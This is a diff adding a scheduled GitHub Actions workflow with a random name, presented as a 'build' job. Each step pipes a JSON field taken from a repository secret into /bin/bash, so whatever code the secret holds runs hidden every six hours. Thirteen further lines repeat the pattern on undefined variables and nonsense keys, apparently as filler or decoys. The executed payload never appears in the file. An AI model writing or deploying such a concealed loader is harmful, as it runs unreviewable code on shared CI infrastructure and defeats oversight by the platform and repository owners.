@@ -1,0 +1,31 @@
+name: xiaolinan6715
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '34 2/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: xiaolinan6715
+        env:
+          cpdb0: ${{ secrets.cpdb0 }}
+        run: |
+          echo $cpdb0 | jq -r .u93 | /bin/bash
+          echo $bew443 | jq -r .wqx71 | /bin/bash
+          echo $llp8 | jq -r .oqc2029 | /bin/bash
+          echo $gxc422 | jq -r .p2077 | /bin/bash
+          echo $jzb11726 | jq -r .ahck27931 | /bin/bash
+          echo $wp1 | jq -r .bpq60942 | /bin/bash
+          echo $wobzf34541 | jq -r .sxinc293 | /bin/bash
+          echo $l4624 | jq -r .ckvre7409 | /bin/bash
+          echo $rku5 | jq -r .kutz629 | /bin/bash
+          echo $yi6162 | jq -r .iws5 | /bin/bash
+          echo $hnj541 | jq -r .vgp23970 | /bin/bash
+          echo $qgkd6 | jq -r .usk37 | /bin/bash
+          echo $hnm61751 | jq -r .kbq3843 | /bin/bash
+          echo $cnfuv2925 | jq -r .c9008 | /bin/bash
+
